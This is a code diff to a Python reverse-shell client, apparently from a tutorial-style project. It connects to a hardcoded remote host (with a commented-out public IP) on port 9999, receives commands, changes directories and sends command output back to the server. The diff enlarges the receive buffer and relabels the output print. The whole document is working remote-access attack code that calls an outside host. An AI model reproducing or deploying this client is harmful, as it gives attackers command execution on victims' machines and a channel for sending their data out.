@@ -3,14 +3,14 @@
 import socket, os, subprocess, urllib.request, urllib.parse, re, time
 
 s = socket.socket()
-host = "192.168.1.172"
+host = "192.168.1.172"#server IP"168.235.86.52"
 port = 9999
 
 s.connect((host, port))
 
 while True:
     #recv function takes a number as an arguement; arguement is the buffer time
-    data = s.recv(1024)
+    data = s.recv(20480)
     #this conditionals takes the bytes and decodes them into a string format then it checks to see if the first two characaters are 'cd'
     if data[:2].decode("utf-8") == 'cd':
         os.chdir(data[3:].decode("utf-8"))
@@ -23,6 +23,6 @@ while True:
       currentWD = os.getcwd() + "> "
       s.send(str.encode(output_str + currentWD))
 
-      print(output_str)
+      print("This information is being sent to the server: " + output_str)
       
     
